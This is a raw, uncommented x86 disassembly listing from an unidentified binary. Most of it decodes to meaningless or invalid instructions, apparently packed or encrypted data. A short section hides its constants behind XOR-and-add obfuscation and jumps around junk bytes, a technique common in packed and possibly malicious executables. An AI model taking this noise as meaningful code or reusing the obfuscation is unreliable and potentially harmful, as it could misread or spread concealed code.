  41af93:	adc    BYTE PTR [edx],0x18
  41af96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af97:	ret    0x643
  41af9a:	leave  
  41af9b:	fisttp WORD PTR ds:0xcee75b35
  41afa1:	dec    edx
  41afa2:	xchg   ebp,eax
  41afa3:	and    ecx,DWORD PTR [ebx-0x7d05b638]
  41afa9:	lea    ebx,[edi-0x163478d6]
  41afaf:	xor    BYTE PTR [edx],al
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x10181003]
  41afc0:	dec    ecx
  41afc1:	and    eax,0x7fde10e0
  41afc6:	js     0x41afd8
  41afc8:	jle    0x41b042
  41afca:	js     0x41b045
  41afcc:	jecxz  0x41af9a
  41afce:	inc    eax
  41afcf:	test   al,0x48
  41afd1:	gs pop edi
  41afd3:	xor    ecx,ecx
  41afd5:	cmp    eax,DWORD PTR [ecx-0x73]
  41afd8:	sahf   
  41afd9:	cwde   
  41afda:	or     ebx,eax
  41afdc:	hlt    
  41afdd:	cli    
  41afde:	mov    ch,0x26
  41afe0:	mov    ah,0xc4
  41afe2:	fs ins DWORD PTR es:[edi],dx
  41afe4:	(bad)  
  41afe5:	mov    ds,WORD PTR [edi+0x5d948088]
  41afeb:	not    DWORD PTR [edi]
  41afed:	scas   al,BYTE PTR es:[edi]
  41afee:	ficom  DWORD PTR [ecx-0x540a463f]
  41aff4:	mov    eax,0x3e62bd65
  41aff9:	jl     0x41afb9
  41affb:	jle    0x41af90
  41affd:	push   esi
  41affe:	in     al,0x92
  41b000:	push   edi
  41b001:	jne    0x41afa8
  41b003:	xchg   ebp,eax
  41b004:	inc    ebp
  41b005:	push   0x6f506d7a
  41b00a:	jno    0x41af8c
  41b00c:	loopne 0x41b013
  41b00e:	sbb    dh,BYTE PTR [eax]
  41b010:	loopne 0x41b036
  41b012:	push   ecx
  41b013:	adc    WORD PTR [eax+0x199d5bf1],bx
  41b01a:	pop    es
  41b01b:	loope  0x41affa
  41b01d:	pop    ebx
  41b01e:	pop    ds
  41b01f:	xchg   ecx,eax
  41b020:	sub    esp,ecx
  41b022:	fs retf 
  41b024:	ret    
  41b025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b027:	clc    
  41b028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b029:	jecxz  0x41afcb
  41b02b:	in     al,dx
  41b02c:	ss pusha 
  41b02e:	sti    
  41b02f:	mov    esp,0x5e90d394
  41b034:	push   0x61f3ce50
  41b039:	mov    ecx,0xcf004927
  41b03e:	lds    ebx,FWORD PTR ds:0x4c226a0b
  41b044:	push   ecx
  41b045:	sbb    al,0x7b
  41b047:	sahf   
  41b048:	fcom   QWORD PTR [ebx]
  41b04a:	sahf   
  41b04b:	mov    eax,ds:0xba5aebbe
  41b050:	outs   dx,DWORD PTR ds:[esi]
  41b051:	out    dx,al
  41b052:	and    BYTE PTR [ebx],ah
  41b054:	inc    edi
  41b055:	inc    esi
  41b056:	cmp    al,0xcf
  41b058:	clc    
  41b059:	sar    DWORD PTR [esp+edx*4],cl
  41b05c:	outs   dx,DWORD PTR ds:[esi]
  41b05d:	xor    eax,0xc41023
  41b062:	imul   esi,DWORD PTR [eax+0x1eb71cea],0xfffffff2
  41b069:	push   ds
  41b06a:	dec    esp
  41b06b:	xor    ah,BYTE PTR [edx+0x18e0e7c6]
  41b071:	std    
  41b072:	inc    ebp
  41b073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b074:	sahf   
  41b075:	cmp    dh,BYTE PTR [edx+0x19]
  41b078:	loope  0x41b032
  41b07a:	jmp    DWORD PTR [ecx]
  41b07c:	imul   edx,edx,0x2062beb6
  41b082:	sbb    al,0xd
  41b084:	cpuid  
  41b086:	push   ds
  41b087:	mov    esi,0x4991896a
  41b08c:	inc    esi
  41b08d:	or     al,0x32
  41b08f:	fiadd  DWORD PTR [ecx]
  41b091:	aaa    
  41b092:	xchg   ebx,eax
  41b093:	cmp    al,ah
  41b095:	mov    al,0x30
  41b097:	xor    ebp,DWORD PTR [esi]
  41b099:	vhsubps xmm0,xmm7,XMMWORD PTR [eax+0x2e]
  41b09e:	mov    bh,0x1
  41b0a0:	shl    BYTE PTR [edi],cl
  41b0a2:	test   eax,0x4297cc14
  41b0a7:	lods   eax,DWORD PTR ds:[esi]
  41b0a8:	pop    ss
  41b0a9:	stos   DWORD PTR es:[edi],eax
  41b0aa:	xlat   BYTE PTR ds:[ebx]
  41b0ab:	cld    
  41b0ac:	sti    
  41b0ad:	xor    BYTE PTR ss:[bp+si+0x4a45],bh
  41b0b3:	add    al,0x72
  41b0b5:	push   edx
  41b0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b7:	pop    ebp
  41b0b8:	rcl    esp,0xa0
  41b0bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0bc:	inc    edi
  41b0bd:	out    dx,eax
  41b0be:	xor    DWORD PTR [ebp+0x25],ebx
  41b0c1:	retf   
  41b0c2:	mov    ds:0xe07b3dbd,eax
  41b0c7:	call   0x35953944
  41b0cc:	sbb    esi,esi
  41b0ce:	inc    esp
  41b0cf:	loope  0x41b149
  41b0d1:	jmp    0xdec7:0x962d9c0b
  41b0d8:	xchg   esi,esp
  41b0da:	test   BYTE PTR [ebx+ecx*1-0xf],bl
  41b0de:	jb     0x41b0b6
  41b0e0:	mov    esi,0xc308e160
  41b0e5:	jle    0x1aa74075
  41b0eb:	push   ecx
  41b0ec:	pop    es
  41b0ed:	dec    ecx
  41b0ee:	inc    ebx
  41b0ef:	outs   dx,BYTE PTR ds:[esi]
  41b0f1:	jne    0x41b148
  41b0f3:	add    BYTE PTR [bx],cl
  41b0f6:	imul   edi,DWORD PTR [ebx+0x15],0x39
  41b0fa:	lds    ecx,FWORD PTR [edx+ecx*4-0x7d]
  41b0fe:	jg     0x41b0fa
  41b100:	mov    ah,ch
  41b102:	into   
  41b103:	in     eax,0x64
  41b105:	test   eax,0xe52549f0
  41b10a:	sti    
  41b10b:	push   ds
  41b10c:	aam    0x1d
  41b10e:	ror    BYTE PTR [edx+ecx*1+0x19],cl
  41b112:	or     ah,BYTE PTR [ebp-0x5acf0693]
  41b118:	sti    
  41b119:	and    al,0x8a
  41b11b:	pop    esp
  41b11c:	js     0x41b101
  41b11e:	push   ebx
  41b11f:	test   DWORD PTR [ebp+ecx*1+0x7e],edi
  41b123:	xor    eax,0x2d27f5fa
  41b128:	ja     0x41b0ae
  41b12a:	in     eax,0x56
  41b12c:	adc    DWORD PTR [ebp+0x71],esi
  41b12f:	ficomp DWORD PTR [eax-0x3761851a]
  41b135:	sar    DWORD PTR [ebp-0x1f0be85],1
  41b13b:	xor    bh,BYTE PTR [edx]
  41b13d:	or     ebp,DWORD PTR [ecx]
  41b13f:	ins    BYTE PTR es:[edi],dx
  41b140:	jl     0x41b162
  41b142:	mov    eax,ds:0x632f6951
  41b147:	xchg   ebp,eax
  41b148:	(bad)  
  41b14a:	push   ds
  41b14b:	mov    ch,0x72
  41b14d:	js     0x41b0f3
  41b14f:	cmp    BYTE PTR [edx+ebx*1],0x82
  41b153:	add    BYTE PTR [esi],dh
  41b155:	jmp    0x41b143
  41b157:	fstp   TBYTE PTR [edx-0x431a539a]
  41b15d:	out    0xc8,eax
  41b15f:	aam    0xf7
  41b161:	sbb    DWORD PTR [esp+edi*8+0x1e],ebp
  41b165:	outs   dx,DWORD PTR ds:[esi]
  41b166:	mov    ecx,0x9b4e6afe
  41b16b:	mov    dh,0x51
  41b16d:	xchg   edx,eax
  41b16e:	or     DWORD PTR [ebx+ecx*4],edx
  41b171:	add    eax,0xfaf24d47
  41b176:	ins    DWORD PTR es:[edi],dx
  41b177:	lds    ecx,FWORD PTR [ebx]
  41b179:	test   esp,0xaf2b413a
  41b17f:	pop    es
  41b180:	cdq    
  41b181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b182:	dec    edi
  41b183:	mov    ah,0x6
  41b185:	cmp    eax,0x905c1158
  41b18a:	pusha  
  41b18b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b18c:	sub    DWORD PTR [ebp-0x50],ecx
  41b18f:	addr16 jne 0x41b211
  41b192:	push   ecx
  41b193:	ret    0x57a3
  41b196:	jne    0x41b1b2
  41b198:	xor    esp,DWORD PTR [edx-0x20]
  41b19b:	dec    DWORD PTR [edx+0x1b68fd0a]
  41b1a1:	icebp  
  41b1a2:	inc    ebp
  41b1a3:	pusha  
  41b1a4:	or     DWORD PTR [edi+0x62],ecx
  41b1a7:	dec    ecx
  41b1a8:	loop   0x41b1ae
  41b1aa:	rol    DWORD PTR [ebp-0x5b556b1],cl
  41b1b0:	out    0xbe,eax
  41b1b2:	sbb    eax,0xe36310d5
  41b1b7:	nop
  41b1b8:	xor    eax,DWORD PTR [edi+0x75ce2f97]
  41b1be:	loopne 0x41b16b
  41b1c0:	and    BYTE PTR [edx-0x51],0x81
  41b1c4:	inc    ebp
  41b1c5:	in     eax,dx
  41b1c6:	inc    eax
  41b1c7:	cmc    
  41b1c8:	cmp    DWORD PTR [ebx+0x25c3ee18],ecx
  41b1ce:	sbb    al,0xb7
  41b1d0:	icebp  
  41b1d1:	sub    eax,0xc3059c44
  41b1d6:	dec    ebx
  41b1d7:	ja     0x41b1cb
  41b1d9:	inc    edi
  41b1da:	ror    BYTE PTR [ecx+0x15],1
  41b1dd:	mov    eax,ds:0x32ce1e3a
  41b1e2:	into   
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	rcl    BYTE PTR ss:[si],0x6d
  41b1fa:	add    esp,edx
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b27c
  41b205:	fidivr DWORD PTR [ecx+0x63b7e9fd]
  41b20b:	jge    0x41b23b
  41b20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b20e:	cmp    ebp,DWORD PTR [edi-0x4a7b1ae8]
  41b214:	cmp    eax,0x59fb05d5
  41b219:	call   0x21b1:0xb35beb94
  41b220:	sub    al,0xd6
  41b222:	inc    edi
  41b223:	aam    0x34
  41b225:	sti    
  41b226:	push   0xffffff9c
  41b228:	sub    eax,DWORD PTR [eax]
  41b22a:	mov    dh,0xb5
  41b22c:	fs dec edx
  41b22e:	jno    0x41b2a0
  41b230:	fcomp  QWORD PTR [esi-0x2dce9401]
  41b236:	xlat   BYTE PTR ds:[ebx]
  41b237:	(bad)  
  41b238:	jb     0x41b223
  41b23a:	sub    DWORD PTR [eax],esp
  41b23c:	ds sub al,0xf3
  41b23f:	in     eax,0x67
  41b241:	cld    
  41b242:	call   0x410ec255
  41b247:	add    ah,al
  41b249:	adc    eax,0xa6bb4a5c
  41b24e:	xor    DWORD PTR [esi-0x64],edi
  41b251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b252:	jge    0x41b25e
  41b254:	pop    ss
  41b255:	jp     0x41b2b7
  41b257:	or     eax,0xaaab1c6b
  41b25c:	out    dx,eax
  41b25d:	cmp    DWORD PTR [ebx],edi
  41b25f:	shr    BYTE PTR ds:0x544946ed,cl
  41b265:	xor    ebx,DWORD PTR [ecx-0x4ed7d8fb]
  41b26b:	lods   eax,DWORD PTR ds:[esi]
  41b26c:	mov    ds:0x9e688705,al
  41b271:	xchg   ecx,eax
  41b272:	cmp    DWORD PTR [ebp+0x5c],esi
  41b275:	idiv   BYTE PTR [ecx-0x65]
  41b278:	mov    BYTE PTR [ebp+0x7d1dd888],al
  41b27e:	inc    eax
  41b27f:	sub    al,0x51
  41b281:	dec    esp
  41b282:	and    BYTE PTR [edx],dl
  41b284:	(bad)  
  41b285:	push   ss
  41b286:	mov    ds:0x9c4b4457,eax
  41b28b:	xlat   BYTE PTR ds:[ebx]
  41b28c:	sub    eax,0x15e976db
  41b291:	(bad)  
  41b292:	jl     0x41b222
  41b294:	push   ebp
  41b295:	in     eax,0x2
  41b297:	inc    esp
  41b298:	call   0xc9be1b27
  41b29d:	add    ebp,ebx
  41b29f:	mov    cl,0x9
  41b2a1:	stos   BYTE PTR es:[edi],al
  41b2a2:	add    BYTE PTR [edx+0x65],ch
  41b2a5:	aam    0x77
  41b2a7:	xor    ah,0xfd
  41b2aa:	xlat   BYTE PTR ds:[ebx]
  41b2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2ac:	fidivr DWORD PTR [edi+0xec05959]
  41b2b2:	popf   
  41b2b3:	adc    BYTE PTR [esp+ecx*2-0x52977451],dl
  41b2ba:	call   0x501f:0xcada66c4
  41b2c1:	sub    ebx,DWORD PTR [eax-0x12000b58]
  41b2c7:	mov    esp,0xd571e412
  41b2cd:	or     bl,BYTE PTR ds:0xb26c4c9c
  41b2d3:	or     eax,0x609758c8
  41b2d8:	fs xchg ebp,eax
  41b2da:	repz fdivr DWORD PTR [esi]
  41b2dd:	jp     0x41b2f7
  41b2df:	jbe    0x41b350
  41b2e1:	sub    bh,0x90
  41b2e4:	push   0x88deee59
  41b2e9:	sub    al,0xfe
  41b2eb:	mov    DWORD PTR [ebx],edx
  41b2ed:	lods   al,BYTE PTR ds:[esi]
  41b2ee:	jo     0x41b287
  41b2f0:	dec    edi
  41b2f1:	and    DWORD PTR [edx],ebx
  41b2f3:	jle    0x41b302
  41b2f5:	ss std 
  41b2f7:	fstp   st(0)
  41b2f9:	retf   0xc79e
  41b2fc:	repnz ror BYTE PTR [esi-0x75],1
  41b300:	test   BYTE PTR [edx],bh
  41b302:	fs jo  0x41b337
  41b305:	aam    0x38
  41b307:	sub    bh,ch
  41b309:	(bad)  
  41b30a:	mov    ebp,0x218670f8
  41b30f:	mov    al,ds:0xbf65fffb
  41b314:	push   eax
  41b315:	mov    edi,0x7d2f7e9e
  41b31a:	push   0x142fadba
  41b31f:	dec    ebp
  41b320:	mul    DWORD PTR [ebx+0x75]
  41b323:	sbb    ah,dh
  41b325:	sub    BYTE PTR [edx+0x55],0xc7
  41b329:	stc    
  41b32a:	and    eax,0xc7942cd6
  41b32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b330:	dec    edx
  41b331:	sub    bl,bl
  41b333:	dec    esi
  41b334:	stos   DWORD PTR es:[edi],eax
  41b335:	popf   
  41b336:	pop    edi
  41b337:	adc    BYTE PTR [edx+0x2a],ch
  41b33a:	nop
  41b33b:	icebp  
  41b33c:	adc    eax,0xe0898b0b
  41b341:	xchg   DWORD PTR [ebp+0x4d],ebx
  41b344:	adc    al,0x4a
  41b346:	aaa    
  41b347:	mov    ah,0x31
  41b349:	add    al,BYTE PTR [edx-0x5d]
  41b34c:	std    
  41b34d:	cld    
  41b34e:	pop    esi
  41b34f:	das    
  41b350:	mov    edi,0x4c8ad4c9
  41b356:	rcl    DWORD PTR [edi],1
  41b358:	mov    edx,0xe512521c
  41b35d:	gs jnp 0x41b357
  41b360:	pop    esi
  41b361:	add    dl,BYTE PTR ds:0xcb040265
  41b367:	xchg   DWORD PTR [ebx-0x5dcd8e8b],esp
  41b36d:	sub    al,0x93
  41b36f:	sub    eax,0x8d445a1
  41b374:	ins    BYTE PTR es:[edi],dx
  41b375:	fistp  QWORD PTR [eax+edx*1]
  41b378:	jne    0x41b367
  41b37a:	popf   
  41b37b:	jae    0x41b38a
  41b37d:	xchg   ebp,eax
  41b37e:	sbb    ecx,edi
  41b380:	scas   al,BYTE PTR es:[edi]
  41b381:	es data16 or dl,ch
  41b385:	inc    ecx
  41b386:	xor    DWORD PTR [edi-0x3ac757ea],ebp
  41b38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b38d:	mov    ah,0x15
  41b38f:	call   FWORD PTR [ebp+eax*1-0x44e6743e]
  41b396:	adc    eax,0xc1671692
  41b39b:	(bad)  
  41b39c:	fsubr  DWORD PTR [ecx]
  41b39e:	sub    dl,dl
  41b3a0:	scas   al,BYTE PTR es:[edi]
  41b3a1:	mov    ebx,0x3fe93be7
  41b3a6:	sahf   
  41b3a7:	rcr    DWORD PTR ds:0xb21b4c19,0xbf
  41b3ae:	adc    al,0x34
  41b3b0:	or     eax,0x2d1b2405
  41b3b5:	cld    
  41b3b6:	push   esi
  41b3b7:	pop    esi
  41b3b8:	adc    BYTE PTR [ebx],cl
  41b3ba:	jl     0x41b37d
  41b3bc:	daa    
  41b3bd:	ror    edx,0x7
  41b3c0:	xor    al,0x46
  41b3c2:	mov    ch,BYTE PTR [ebx]
  41b3c4:	popf   
  41b3c5:	cli    
  41b3c6:	gs jns 0x41b3b1
  41b3c9:	aas    
  41b3ca:	push   edi
  41b3cb:	shl    DWORD PTR [eax-0x1d],1
  41b3ce:	not    DWORD PTR [edi+0x7f3fd4df]
  41b3d4:	inc    ebx
  41b3d5:	and    eax,0xe3a5aa2
  41b3da:	push   esp
  41b3db:	sub    ecx,DWORD PTR [ebp-0x7426ddb]
  41b3e1:	xor    BYTE PTR [ecx+edx*1+0x38],al
  41b3e5:	add    eax,0x92cf836a
  41b3ea:	mov    eax,ds:0xfb385e13
  41b3ef:	mov    cl,0x8b
  41b3f1:	in     al,0x7b
  41b3f3:	pop    edx
  41b3f4:	retf   
  41b3f5:	mov    ah,0xa9
  41b3f7:	mov    bl,BYTE PTR [ecx+0x7e4108aa]
  41b3fd:	pop    ebp
  41b3fe:	(bad)  
  41b3ff:	jl     0x41b397
  41b401:	add    eax,0x87d3fe7b
  41b406:	in     al,0x39
  41b408:	fs dec ebx
  41b40a:	pop    esi
  41b40b:	adc    eax,0xd6306831
  41b410:	add    ah,BYTE PTR [edi+eax*2-0x7b]
  41b414:	enter  0x69a3,0x25
  41b418:	xor    DWORD PTR [edx-0x50f06b2a],ebx
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ba:	pop    ebx
  41b4bb:	loope  0x41b4e9
  41b4bd:	shl    dl,0x7f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b476
  41b4c6:	ret    
  41b4c7:	sbb    edi,DWORD PTR [eax+ebx*4+0x1069674a]
  41b4ce:	inc    ebx
  41b4cf:	fiadd  DWORD PTR [edi+0x7250b49a]
  41b4d5:	mov    al,0x6b
  41b4d7:	test   al,0xac
  41b4d9:	and    BYTE PTR [edx+0x58a1116a],bh
  41b4df:	aam    0x70
  41b4e1:	aam    0x43
  41b4e3:	cmp    ebp,edx
  41b4e5:	add    edi,DWORD PTR [ebx+edx*4]
  41b4e8:	fld    TBYTE PTR [ecx+0x3]
  41b4ec:	xchg   BYTE PTR ds:0x3c62e7f5,ch
  41b4f2:	shr    BYTE PTR [edi+0x7f40f475],cl
  41b4f8:	push   0x4747107
  41b4fd:	loopne 0x41b55c
  41b4ff:	mov    bl,0x2
  41b501:	int3   
  41b502:	cmp    al,0x40
  41b504:	scas   al,BYTE PTR es:[edi]
  41b505:	cdq    
  41b506:	inc    ecx
  41b507:	into   
  41b508:	pushf  
  41b509:	pop    edi
  41b50a:	xor    eax,0x456abd31
  41b50f:	out    dx,al
  41b510:	adc    esi,DWORD PTR ds:0x1cb9827a
  41b516:	(bad)  
  41b517:	xchg   ecx,eax
  41b518:	repnz stos BYTE PTR es:[edi],al
  41b51a:	push   esp
  41b51b:	mov    bl,0xe7
  41b51d:	mov    ecx,0xf3a41b9d
  41b522:	ss int 0x75
  41b525:	sbb    ebx,DWORD PTR [ebp-0x23]
  41b528:	add    eax,0x5ba7a0e7
  41b52d:	mov    WORD PTR [edi-0x54],cs
  41b530:	mov    eax,ds:0x35d6c37
  41b535:	add    ch,BYTE PTR [ebp+0x56]
  41b538:	sbb    BYTE PTR [eax],0x2
  41b53b:	into   
  41b53c:	out    dx,eax
  41b53d:	and    BYTE PTR [ebx+0x8b5cecc],al
  41b543:	xor    BYTE PTR [ecx],ch
  41b545:	aas    
  41b546:	pop    ecx
  41b547:	add    ebx,edi
  41b549:	or     eax,0xdb084c1a
  41b54e:	hlt    
  41b54f:	fist   DWORD PTR ds:0x7f4b872b
  41b555:	pop    ebx
  41b556:	int    0xb6
  41b558:	sbb    dl,BYTE PTR [edx]
  41b55a:	(bad)  [esi-0x18f819aa]
  41b560:	pop    ss
  41b561:	nop
  41b562:	repz popa 
  41b564:	inc    edx
  41b565:	push   eax
  41b566:	add    BYTE PTR [edx-0xf4bfdf5],al
  41b56c:	rcl    BYTE PTR [esi+0x1290e57f],0x93
  41b573:	int    0x58
  41b575:	adc    BYTE PTR [esi+0x5877cdd3],ch
  41b57b:	mov    dl,0xfe
  41b57d:	xlat   BYTE PTR ds:[ebx]
  41b57e:	cs aas 
  41b580:	inc    ecx
  41b581:	push   ebx
  41b582:	cdq    
  41b583:	and    al,BYTE PTR [ecx+0x32]
  41b586:	(bad)  [esi]
  41b588:	pop    edi
  41b589:	xlat   BYTE PTR ds:[ebx]
  41b58a:	xor    dh,dl
  41b58c:	repz addr16 retf 
  41b58f:	cwde   
  41b590:	cs fmul st(3),st
  41b593:	test   al,0x0
  41b595:	jae    0x41b589
  41b597:	pusha  
  41b598:	dec    ecx
  41b599:	mov    edi,0x70ae7cf6
  41b59e:	call   0x99f2:0x26ebfead
  41b5a5:	jnp    0x41b536
  41b5a7:	push   esi
  41b5a8:	push   0xffffffd5
  41b5aa:	daa    
  41b5ab:	mov    edx,0x188592b4
  41b5b0:	fisttp DWORD PTR [ecx+0x24a94443]
  41b5b6:	xor    eax,0x8cf6f0d0
  41b5bb:	aam    0xc5
  41b5bd:	sbb    DWORD PTR [edx-0x19488146],0xffffffef
  41b5c4:	test   BYTE PTR [eax+0x1bac4747],0x6e
  41b5cb:	sbb    eax,0xd15981ab
  41b5d0:	fs xchg edi,eax
  41b5d2:	adc    DWORD PTR [edx+ebx*4],esp
  41b5d5:	lods   eax,DWORD PTR ds:[esi]
  41b5d6:	test   BYTE PTR [esi+eiz*8-0x28],bh
  41b5da:	(bad)  
  41b5db:	je     0x41b5eb
  41b5dd:	jp     0x41b630
  41b5df:	(bad)  
  41b5e0:	xlat   BYTE PTR ds:[ebx]
  41b5e1:	int    0x3b
  41b5e3:	cwde   
  41b5e4:	fadd   QWORD PTR [esi+0x1b]
  41b5e7:	addr16 cmp al,0xa3
  41b5ea:	xchg   esi,eax
  41b5eb:	test   al,0xa2
  41b5ed:	stos   BYTE PTR es:[edi],al
  41b5ee:	sti    
  41b5ef:	push   esp
  41b5f0:	inc    esp
  41b5f1:	xchg   edx,eax
  41b5f2:	mov    bh,0xf5
  41b5f4:	cmp    al,0xd6
  41b5f6:	jmp    0xcbf1432b
  41b5fb:	pop    ecx
  41b5fc:	js     0x41b611
  41b5fe:	dec    ebx
  41b5ff:	fst    DWORD PTR [edi]
  41b601:	mov    al,0xf
  41b603:	and    ch,BYTE PTR [edi+eax*2]
  41b606:	ds push 0xf67fed5d
  41b60c:	mov    bh,0x39
  41b60e:	and    esi,DWORD PTR [ebp+0x2b]
  41b611:	adc    BYTE PTR [edx+ebx*4],dl
  41b614:	loop   0x41b5ca
  41b616:	aam    0xfc
  41b618:	cmp    al,0x5d
  41b61a:	ss ins BYTE PTR es:[edi],dx
  41b61c:	mov    eax,0xf3f71676
  41b621:	xor    DWORD PTR [ebx+0x4f],0x2d
  41b625:	mov    ds:0xb8eff429,eax
  41b62a:	inc    esp
  41b62b:	inc    ecx
  41b62c:	or     esi,DWORD PTR [esi+0x16]
  41b62f:	adc    ebp,DWORD PTR [ebx]
  41b631:	test   DWORD PTR [esi],edi
  41b633:	cmp    al,0xdd
  41b635:	push   ss
  41b636:	fist   DWORD PTR [edi-0x78415903]
  41b63c:	out    dx,al
  41b63d:	arpl   si,cx
  41b63f:	or     DWORD PTR [esi+0x44],0xffffffdc
  41b643:	xor    al,0x7c
  41b645:	je     0x41b618
  41b647:	push   cs
  41b648:	ror    DWORD PTR ds:0x98f5ed84,1
  41b64e:	cmc    
  41b64f:	jns    0x41b634
  41b651:	dec    edi
  41b652:	xor    al,0x33
  41b654:	xor    sp,WORD PTR [ecx+0x63422943]
  41b65b:	dec    DWORD PTR [ebx+0x14]
  41b65e:	in     al,0xef
  41b660:	das    
  41b661:	js     0x41b67f
  41b663:	repnz call 0x8413:0xb9b91465
  41b66b:	mov    ecx,0x16a7900d
  41b670:	jb     0x41b6c1
  41b672:	lahf   
  41b673:	jbe    0x41b695
  41b675:	add    al,0xc2
  41b677:	mov    BYTE PTR [ebp-0x5d],cl
  41b67a:	mov    ebx,edx
  41b67c:	fdivr  st,st(0)
  41b67e:	cs inc ebx
  41b680:	jge    0x41b689
  41b682:	wrmsr  
  41b684:	xchg   esi,eax
  41b685:	vpcmpgtb xmm6,xmm3,XMMWORD PTR [eax+0x7e]
  41b68a:	mov    BYTE PTR fs:[ecx+0x63362712],dl
  41b691:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b693:	add    BYTE PTR [ebx],0xf0
  41b696:	pushw  0xff96
  41b699:	mov    bh,0x22
  41b69b:	mov    WORD PTR [ecx+0x45b0741c],es
  41b6a1:	jnp    0x41b68c
  41b6a3:	xor    bl,cl
  41b6a5:	ja     0x41b6d9
  41b6a7:	xchg   ecx,eax
  41b6a8:	sti    
  41b6a9:	xor    DWORD PTR [ecx-0x3c706c70],ebx
  41b6af:	mov    ebx,0xf8d845e1
  41b6b4:	loop   0x41b660
  41b6b6:	dec    ebp
  41b6b7:	pop    es
  41b6b8:	je     0x41b65d
  41b6ba:	sub    edi,ebx
  41b6bc:	test   eax,0xdff02675
  41b6c1:	mov    esp,0x93e0b8de
  41b6c6:	test   BYTE PTR ds:0x2f72b9d4,0xb8
  41b6cd:	push   cs
  41b6ce:	fstp   TBYTE PTR [ebp-0x14]
  41b6d1:	clc    
  41b6d2:	dec    edx
  41b6d3:	dec    ebp
  41b6d4:	xor    eax,0x5f7b97fb
  41b6d9:	mov    bl,BYTE PTR [eax]
  41b6db:	int3   
  41b6dc:	mov    eax,0xc603c133
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx+0x155468f6]
  41b6f4:	lds    edx,FWORD PTR [edx+0x787fe0d8]
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b6c1
  41b6ff:	jmp    0x3fa2:0x2554eeda
  41b706:	popf   
  41b707:	mov    al,0xb4
  41b709:	stos   DWORD PTR es:[edi],eax
  41b70a:	shr    DWORD PTR [edi+0x5],1
  41b70d:	xchg   edx,eax
  41b70e:	std    
  41b70f:	mov    esp,0xc337a0aa
  41b714:	pusha  
  41b715:	inc    edx
  41b716:	sbb    al,0x37
  41b718:	into   
  41b719:	mov    bh,0x72
  41b71b:	cmp    BYTE PTR [edi-0x3],bh
  41b71e:	stos   DWORD PTR es:[edi],eax
  41b71f:	jmp    0x41b795
  41b721:	cmp    eax,0xee1cf2ba
  41b726:	inc    edx
  41b727:	fwait
  41b728:	out    0x83,eax
